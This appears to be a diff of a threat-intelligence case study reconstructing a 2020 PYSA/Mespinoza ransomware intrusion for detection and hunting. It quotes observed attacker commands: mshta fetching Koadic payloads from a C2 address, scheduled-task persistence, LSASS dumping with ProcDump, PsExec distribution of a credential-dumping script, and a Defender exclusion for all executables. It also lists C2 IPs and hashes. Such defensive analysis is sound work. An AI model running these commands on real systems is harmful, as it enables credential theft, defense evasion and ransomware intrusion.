@@ -1,448 +1,179 @@
 # PYSA / Mespinoza - DFIR Case Study
 
-👉🏾 [**Version française disponible ici**](./dfir_case_study_FR.md)
+👉🏾 [**Version française**](./dfir_case_study_FR.md)
 
 **AFRINTEL Threat Actor Intelligence**
 
-- **Actor / Group:** PYSA / Mespinoza
-- **Threat Type:** Ransomware / Double Extortion
-- **Analysis Type:** DFIR intrusion reconstruction
-- **Documented Intrusion Duration:** ~8 hours
-- **Primary Technical Source:** The DFIR Report
-- **Report Date:** 23 November 2020
-- **Confidence Level:** High
-- **Last AFRINTEL Update:** 25 August 2026
+- **Actor / Operation:** PYSA / Mespinoza
+- **Threat type:** Ransomware / Double extortion
+- **Analysis type:** DFIR reconstruction of one documented intrusion
+- **Documented duration:** about 8 hours
+- **Primary source:** The DFIR Report, Case 1010
+- **Report date:** 23 November 2020
+- **Geography:** external reference case, not an AFRINTEL African victim
+- **Last updated:** 26 August 2026
 
 ---
 
-## 1. Incident Summary
+## 1. Incident summary
 
-The DFIR Report documented a PYSA / Mespinoza intrusion lasting approximately eight hours from initial access to final ransomware deployment.
+The DFIR Report documented an intrusion in which the threat actor entered through Internet-exposed RDP using a valid Domain Administrator account. The connection came from a Tor exit node and was handed off across three Tor exit IPs during the intrusion.
 
-The threat actor obtained initial access to a Windows host with RDP directly exposed to the Internet by using a valid Domain Administrator account.
+The actor moved to a domain controller within minutes, deployed PowerShell Empire, used Koadic, repeatedly collected credentials, moved mainly through RDP, used PsExec for automated credential collection and eventually deployed PYSA ransomware around the 7.5-hour mark.
 
-Initial connections and several subsequent access pivots originated from three different Tor exit nodes.
+No plaintext exfiltration channel was directly seen. Exfiltration itself was confirmed later because canary documents from the victim environment were opened from external Tor exit nodes.
 
-After initial access, the actor rapidly:
-
-1. moved laterally to the domain controller;
-2. deployed PowerShell Empire;
-3. performed multiple credential-dumping operations;
-4. used Koadic as an additional C2 channel;
-5. browsed and collected data;
-6. prepared ransomware deployment;
-7. encrypted systems approximately 7.5 hours after initial access.
-
-Data exfiltration was not directly observed in clear text during the intrusion. It was nevertheless confirmed after encryption when exfiltrated canary documents generated callbacks from Tor exit nodes.
+This is an **incident-level DFIR case**. AFRINTEL does not apply this full chain to every PYSA victim.
 
 ---
 
-## 2. Attack Chain
+## 2. Main attack chain
 
-### 2.1 Initial Access
-
-- **T1133 – External Remote Services**
-  - RDP service directly exposed to the Internet.
-
-- **T1078 – Valid Accounts**
-  - Use of a valid Domain Administrator account.
-
-- **T1021.001 – Remote Desktop Protocol**
-  - Interactive RDP connection.
-
-The initial access originated from a Tor exit node.
-
-During the intrusion, three IP addresses associated with the Tor network were successively used to maintain RDP access.
-
-**Evidence:** Observed  
-**Confidence:** High
+| Phase | Technique | ATT&CK | Behavior | Evidence | Scope | Confidence | Provenance |
+|---|---|---|---|---|---|---|---|
+| Initial Access | External Remote Services | T1133 | Internet-exposed RDP | Observed | Incident | High | The DFIR Report |
+| Initial Access | Valid Accounts | T1078 | Valid Domain Administrator account used | Observed | Incident | High | The DFIR Report |
+| Remote Access | Remote Desktop Protocol | T1021.001 | RDP used for entry and most lateral movement | Observed | Incident | High | The DFIR Report |
+| Execution | PowerShell | T1059.001 | Empire launcher and other scripts | Observed | Incident | High | The DFIR Report |
+| Execution | Mshta | T1218.005 | Koadic launched with `mshta` | Observed | Incident | High | The DFIR Report |
+| Persistence | Scheduled Task | T1053.005 | Koadic HTA task at logon as SYSTEM | Observed | Incident | High | The DFIR Report |
+| Credential Access | LSASS Memory | T1003.001 | Task Manager, `comsvcs.dll`, Mimikatz; ProcDump attempted | Observed | Incident | High | The DFIR Report |
+| Credential Access | NTDS | T1003.003 | Shadow copy of `ntds.dit` created/accessed | Observed | Incident | High | The DFIR Report |
+| Discovery | Account Discovery | T1087 | `whoami`, `net` and other commands | Observed | Incident | High | The DFIR Report |
+| Discovery | Remote System Discovery | T1018 | Built-in commands and network discovery | Observed | Incident | High | The DFIR Report |
+| Discovery | Domain Trust Discovery | T1482 | `nltest` and AD-focused discovery | Observed | Incident | High | The DFIR Report |
+| Discovery | Process Discovery | T1057 | Process listing during local discovery | Observed | Incident | High | The DFIR Report |
+| Lateral Movement | SMB/Windows Admin Shares | T1021.002 | PsExec/script distribution | Observed | Incident | High | The DFIR Report |
+| Execution | Service Execution | T1569.002 | PsExec used for remote execution | Observed | Incident | High | The DFIR Report |
+| Defense Evasion | Impair Defenses | T1562.001 | Defender disabled and exclusions added | Observed | Incident | High | The DFIR Report / AFRINTEL mapping |
+| Exfiltration | Exfiltration Over C2 Channel | T1041 | Exact channel not seen; RDP/Empire/Koadic assessed as likely path | Assessed | Incident | Medium | The DFIR Report |
+| Impact | Data Encrypted for Impact | T1486 | PYSA ransomware deployed and executed | Observed | Incident | High | The DFIR Report |
 
 ---
 
-### 2.2 Execution and Post-Exploitation
+## 3. Key commands and artifacts
 
-#### PowerShell Empire
-
-- **T1059.001 – PowerShell**
-  - Deployment of a PowerShell Empire launcher only minutes after initial access.
-
-Empire remained active throughout the intrusion and appears to have served as a secondary or backup C2 channel.
-
-#### Koadic
-
-- **T1218.005 – Mshta**
-  - Koadic launched through `mshta.exe`.
-
-Observed examples:
+### Koadic launch
 
 ```text
 mshta http://45.147.231.210:9999/8k6Mq
 mshta http://45.147.231.210:9999/VtgyT
 ```
 
-Koadic uses JScript / VBScript and Windows Script Host for parts of its execution chain.
-
-**Evidence:** Observed  
-**Confidence:** High
-
----
-
-## 3. Persistence
-
-- **T1053.005 – Scheduled Task/Job: Scheduled Task**
-  - Koadic created a scheduled task that executed at logon under the SYSTEM context.
-
-Observed command:
+### Koadic persistence
 
 ```text
 schtasks /create /tn K0adic /tr "C:\Windows\system32\mshta.exe C:\ProgramData\SZWXNUHHDP.hta" /sc onlogon /ru System /f
 ```
 
-The HTA file was stored at:
-
-```text
-C:\ProgramData\SZWXNUHHDP.hta
-```
-
-**Evidence:** Observed  
-**Confidence:** High
-
----
-
-## 4. Credential Access
-
-One of the most significant aspects of the intrusion was the use of multiple credential-access methods.
-
-### LSASS
-
-- **T1003.001 – OS Credential Dumping: LSASS Memory**
-
-Observed techniques included:
-
-- manual LSASS dump through Task Manager;
-- LSASS dump through `comsvcs.dll`;
-- attempted use of ProcDump;
-- execution of Invoke-Mimikatz.
-
-Attempted ProcDump command:
+### Credential dumping
 
 ```text
 procdump.exe -accepteula -ma lsass.exe mem.dmp
 ```
 
-The report notes that ProcDump was not present on the affected endpoint. This method was therefore **attempted**, but not successfully executed on that host.
+The ProcDump command was attempted, but ProcDump was not present on the endpoint. Other LSASS techniques were successful, including Task Manager and `comsvcs.dll`.
 
-### comsvcs.dll
-
-A PowerShell script distributed through PsExec used `comsvcs.dll` to generate an LSASS dump.
-
-This also maps to:
-
-- **T1218.011 – Rundll32**
-- **T1003.001 – LSASS Memory**
-
-### NTDS
-
-- **T1003.003 – OS Credential Dumping: NTDS**
-
-The threat actor created and accessed a Shadow Copy containing `ntds.dit` on the domain controller.
-
-Windows **Event ID 1917** was observed when the Active Directory Shadow Copy backup was created.
-
-### Additional Methods
-
-The report also documents:
-
-- Invoke-Mimikatz;
-- extraction of LSA Secrets;
-- retrieval and decoding of credentials from the backup application's SQL database;
-- use of the Koadic `hashdump_sam` module.
-
-**Evidence:** Observed  
-**Confidence:** High
-
----
-
-## 5. Discovery
-
-The actor used multiple native Windows utilities:
-
-```text
-quser.exe
-whoami.exe /user
-net.exe group /domain
-net.exe group "Domain Users" /domain
-nltest.exe /dclist:
-arp -a
-```
-
-Associated techniques include:
-
-- **T1087 – Account Discovery**
-- **T1018 – Remote System Discovery**
-- **T1482 – Domain Trust Discovery**
-- **T1057 – Process Discovery**
-
-Additional tools were also used:
-
-- Advanced Port Scanner;
-- ADRecon.
-
-The actor also browsed several MMC consoles related to Active Directory, DNS, Group Policy, storage and backups.
-
-**Evidence:** Observed  
-**Confidence:** High
-
----
-
-## 6. Lateral Movement
-
-### RDP
-
-- **T1021.001 – Remote Desktop Protocol**
-
-RDP was the main lateral-movement mechanism.
-
-The first pivot to a domain controller occurred approximately three minutes after initial access.
-
-### PsExec
-
-PsExec was then used to distribute and execute a PowerShell credential-dumping script across multiple systems.
-
-Documented command:
+### PsExec distribution
 
 ```text
 PsExec.exe -d \\HOST -u "DOMAIN\USER" -p "PASSWORD" -accepteula -s cmd /c "powershell.exe -ExecutionPolicy Bypass -file \\DOMAINCONTROLLER\share$\p.ps1"
 ```
 
-Associated techniques:
-
-- **T1569.002 – Service Execution**
-- **T1021.002 – SMB/Windows Admin Shares**
-
-**Evidence:** Observed  
-**Confidence:** High
-
----
-
-## 7. Command and Control
-
-Three primary C2 channels were identified:
-
-1. RDP;
-2. PowerShell Empire;
-3. Koadic.
-
-### Observed Infrastructure
-
-#### RDP / Tor
-
-```text
-198.96.155.3
-23.129.64.190
-185.220.100.240
-```
-
-These three IP addresses were identified as Tor exit nodes at the time of the incident.
-
-#### Empire
-
-```text
-194.36.190.74:443
-```
-
-#### Koadic
-
-```text
-45.147.231.210:9999
-```
-
-**Important:** these IoCs are historical and relate to the documented 2020 incident. They should not be treated as currently active indicators without additional validation.
-
----
-
-## 8. Exfiltration
-
-- **T1041 – Exfiltration Over C2 Channel**
-
-The DFIR Report states that no clear-text exfiltration was directly observed during the intrusion.
-
-However, after ransomware deployment, canary documents present in the environment were opened externally.
-
-The callbacks originated from Tor exit nodes.
-
-This confirms that files had left the environment.
-
-The source assesses that exfiltration was likely performed through one of the channels already controlled by the attacker:
-
-- RDP;
-- Empire;
-- Koadic.
-
-**AFRINTEL qualification:**
-
-- **Data exfiltration: Confirmed**
-- **Exact exfiltration channel: Assessed / Unconfirmed**
-- **Final exfiltration infrastructure: Not established**
-
-**Confidence:**
-- Exfiltration: High
-- Channel used: Medium
-
----
-
-## 9. Defense Evasion
-
-The actor actively disabled or bypassed security controls.
-
-Observed actions included:
-
-- disabling Windows Defender through Group Policy;
-- modifying `MpPreference`;
-- adding a Defender exclusion for `.exe` files;
-- terminating multiple processes related to security, databases, backups and server applications.
-
-Observed command:
+### Defender exclusion
 
 ```powershell
 Add-MpPreference -ExclusionExtension ".exe"
 ```
 
-**Windows Defender Event ID 5007** events were generated after the configuration change.
-
-**Evidence:** Observed  
-**Confidence:** High
+The case also documents Defender Event IDs 5001 and 5007 around security-control changes.
 
 ---
 
-## 10. Impact
+## 4. Infrastructure and historical IOCs
 
-- **T1486 – Data Encrypted for Impact**
+| Indicator | Context |
+|---|---|
+| `198.96.155.3` | RDP / Tor exit |
+| `23.129.64.190` | RDP / Tor exit |
+| `185.220.100.240` | RDP / Tor exit |
+| `194.36.190.74:443` | Empire C2 |
+| `45.147.231.210:9999` | Koadic C2 |
 
-Approximately 7.5 hours after initial access, the actor began ransomware deployment.
+### Files / hashes
 
-Two files were delivered through RDP:
+| File | SHA-256 |
+|---|---|
+| `svchost.exe` | `df0cd6a8a67385ba67f9017a78d6582db422a137160176c2c5c3640b482b4a6c` |
+| `p.ps1` | `eb1d0acd250d32e16fbfb04204501211ba2a80e34b7ec6260440b7d563410def` |
+| `p.ps1` | `0ab8f14e2c1e6f7c4dfa3d697d935d4fbef3605e15fd0d489d39b7f82c84ba7e` |
+| `XEKFGUIQQB.hta` | `81e0d5945ab7374caf2353f8d019873c88728a6c289884a723321b8a21df3c77` |
 
-```text
-C:\Users\USER\Downloads\svchost.exe
-C:\Users\USER\Downloads\p.ps1
-```
-
-The PowerShell script:
-
-- disabled security controls;
-- terminated multiple processes;
-- checked / enabled RDP in the firewall;
-- prepared the host for encryption.
-
-The PYSA binary was then executed to encrypt the system.
-
-**Evidence:** Observed  
-**Confidence:** High
+These are historical, incident-specific IOCs from 2020. They are not current PYSA infrastructure by default.
 
 ---
 
-## 11. IoCs and Technical Artifacts
+## 5. Exfiltration assessment
 
-### Network Infrastructure
+The source did not observe plaintext exfiltration traffic. It did confirm that files left the environment because canary documents were opened after ransomware deployment from Tor exit nodes.
 
-| Type | Value | Context |
-|---|---|---|
-| IPv4 | `198.96.155.3` | RDP / Tor exit |
-| IPv4 | `23.129.64.190` | RDP / Tor exit |
-| IPv4 | `185.220.100.240` | RDP / Tor exit |
-| IPv4 | `45.147.231.210` | Koadic C2 |
-| IPv4 | `194.36.190.74` | Empire C2 |
+AFRINTEL therefore records:
 
-### Files
-
-```text
-svchost.exe
-p.ps1
-XEKFGUIQQB.hta
-```
-
-### Documented SHA-256 Hashes
-
-```text
-df0cd6a8a67385ba67f9017a78d6582db422a137160176c2c5c3640b482b4a6c
-eb1d0acd250d32e16fbfb04204501211ba2a80e34b7ec6260440b7d563410def
-0ab8f14e2c1e6f7c4dfa3d697d935d4fbef3605e15fd0d489d39b7f82c84ba7e
-81e0d5945ab7374caf2353f8d019873c88728a6c289884a723321b8a21df3c77
-```
-
-> IoCs should be preserved with their date and historical context. Their present-day presence does not, by itself, establish attribution to PYSA.
+- **Data exfiltration:** Confirmed
+- **Exact channel:** Not confirmed
+- **Likely channel:** RDP, Empire or Koadic
+- **Evidence:** Observed for the fact of exfiltration; Assessed for the channel
+- **Confidence:** High for exfiltration, Medium for the channel
 
 ---
 
-## 12. Simplified Analytical Timeline
+## 6. Simplified timeline
 
 ```text
-T+00:00   Exposed RDP + valid Domain Admin account
-    │
-T+00:03   Lateral movement to Domain Controller
-    │
-    ├── Discovery
-    ├── PowerShell Empire
-    │
-    ├── Credential Dumping
-    │      ├── Task Manager → LSASS
-    │      ├── comsvcs.dll → LSASS
-    │      ├── Mimikatz
-    │      └── NTDS.dit / Shadow Copy
-    │
-    ├── Koadic
-    ├── RDP / PsExec
-    ├── Data Collection
-    ├── Defense Evasion
-    │
-T+~07:30  PYSA deployment
-    │
-    ▼
-Encryption
-    │
-    ▼
-Canary document callbacks
-    │
-    ▼
-Exfiltration confirmed
+T+00:00   Exposed RDP + valid Domain Admin
+T+00:03   Lateral movement to domain controller
+           |-- discovery
+           |-- PowerShell Empire
+           |-- LSASS / credential collection
+           |-- Koadic
+           |-- RDP / PsExec
+           |-- file collection
+           |-- Defender impairment
+T+~07:30  PYSA deployment begins
+           |-- encryption
+           |-- later canary callbacks confirm exfiltration
 ```
 
 ---
 
-## 13. AFRINTEL Assessment
+## 7. Detection and threat-hunting opportunities
 
-This case is a particularly useful example of full ransomware-intrusion reconstruction.
+Useful signals from this case include:
 
-It demonstrates that technical attribution should not rely solely on the final ransomware binary.
-
-The assessment is based on correlation of:
-
-- RDP access;
-- compromised accounts;
-- Tor infrastructure;
-- C2 frameworks;
-- PowerShell;
-- credential dumping;
-- lateral movement;
-- collection;
-- exfiltration;
-- ransomware;
-- DFIR timeline.
-
-AFRINTEL classifies the elements in this case study as **TTPs documented in this specific PYSA incident**.
-
-They must not automatically be applied to every PYSA victim tracked by AFRINTEL.
+- Internet-facing RDP used by a privileged account from Tor/VPN infrastructure;
+- rapid RDP pivot from a workstation to a domain controller;
+- `mshta` fetching remote HTA/JScript content;
+- scheduled task launching `mshta` from `C:\ProgramData`;
+- LSASS dumping through `comsvcs.dll` or Task Manager;
+- PsExec distributing PowerShell scripts from a domain-controller share;
+- `ntds.dit` shadow-copy activity and Directory Service Event ID 1917;
+- Defender exclusions for all `.exe` files;
+- repeated credential-dumping behavior across many hosts.
 
 ---
 
-## 14. Primary Source
+## 8. AFRINTEL assessment and intelligence gaps
 
-- The DFIR Report - **PYSA/Mespinoza Ransomware**
-- Publication: 23 November 2020
-- Investigation: Case 1010
-- MITRE ATT&CK mapping and IoCs provided by The DFIR Report
-- Source: https://thedfirreport.com/2020/11/23/pysa-mespinoza-ransomware/
+This case is valuable because the ransomware binary is only the final stage. The intrusion can be reconstructed from access, identity, C2, discovery, credential theft, lateral movement, defense evasion, collection and impact evidence.
+
+The public case does not establish that every PYSA intrusion followed this same playbook. It also does not establish which exact C2 channel carried the stolen files.
+
+---
+
+## 9. Sources
+
+- The DFIR Report - **PYSA/Mespinoza Ransomware**, 23 November 2020, Case 1010
+- MITRE ATT&CK for technique normalization
 
 ---
 
